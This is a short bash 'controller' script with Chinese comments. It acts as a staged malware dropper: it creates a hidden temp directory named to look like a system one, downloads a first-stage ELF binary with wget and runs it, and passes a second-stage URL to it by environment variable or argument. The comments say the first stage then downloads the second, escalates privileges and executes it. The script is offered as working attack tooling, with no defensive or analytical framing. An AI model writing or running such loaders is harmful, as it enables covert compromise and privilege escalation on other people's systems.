#!/bin/bash
# controller.sh

set -e

TMPDIR="/tmp/.sysd-tmp-$(head -c8 /dev/urandom |xxd -p -c8)"
mkdir -p "$TMPDIR" 2>/dev/null
cd "$TMPDIR" || exit 1

echo "[*] Downloading stage1..."
URL1="https://example.com/x1.elf"
URL2="https://example.com/x2.elf"          # ← 这个URL x1也要知道

# 只下载第一个阶段
wget -q --no-cache "$URL1" -O x1.elf || exit 1
chmod +x x1.elf

echo "[*] Launching stage1..."
# 把第二阶段URL通过环境变量或参数传下去（看x1支不支持）
# 方式A：环境变量（最常用）
X2_URL="$URL2" ./x1.elf

# 方式B：命令行参数（如果x1支持）
# ./x1.elf --next-stage "$URL2"

# 方式C：x1内部硬编码了URL2（最常见但最不灵活）
# ./x1.elf

# 一般到这里控制器就可以退出了
# x1后续会自己处理下载x2、提权、执行x2等全部流程
exit 0


# 思路就是让下载的x1内部去执行这个x2，而不是在外面来执行。